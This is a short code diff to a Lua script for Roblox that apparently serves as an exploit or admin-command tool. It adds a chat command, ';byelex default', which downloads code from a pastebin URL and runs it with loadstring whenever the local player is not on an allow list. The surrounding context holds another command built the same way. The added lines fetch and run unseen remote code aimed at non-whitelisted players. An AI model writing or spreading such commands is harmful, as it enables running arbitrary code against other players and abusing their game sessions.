@@ -10700,6 +10700,11 @@ local commands = {
 			loadstring(game:HttpGet("https://pastebin.com/raw/EiTjShAQ"))()
 		end
 	end,
+	[";byelex default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://pastebin.com/raw/7v1yr6i1"))()
+		end
+	end,
 	[";freeze default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
